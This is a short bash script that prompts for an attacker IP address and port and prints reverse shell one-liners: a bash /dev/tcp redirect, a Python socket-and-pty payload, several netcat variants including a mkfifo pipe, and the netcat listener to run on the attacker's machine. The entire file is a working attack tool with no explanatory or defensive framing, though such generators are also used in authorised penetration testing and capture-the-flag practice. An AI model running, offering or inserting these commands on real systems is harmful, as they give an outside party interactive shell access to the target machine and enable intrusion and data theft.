echo -n "[*]Enter attacker ip: " ; read ip
echo -n "[*]Enter port: "; read port

#print best oneliner revshells
printf "\n\n"
echo "[*]Normal Bash"
echo "bash -i >& /dev/tcp/$ip/$port 0>&1"

printf "\n\n"
echo "[*]Python"
printf "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' "
printf "\n\n"

echo "[*]Netcat"
echo "nc -e /bin/sh $ip $port"
echo "nc -e /bin/bash $ip $port"
echo "nc -c bash $ip $port"
echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"


#listner
#nc -nvlp port
printf "\n\n"
echo "[*]Listner [Attacker-machine]"
echo "nc -nvlp $port"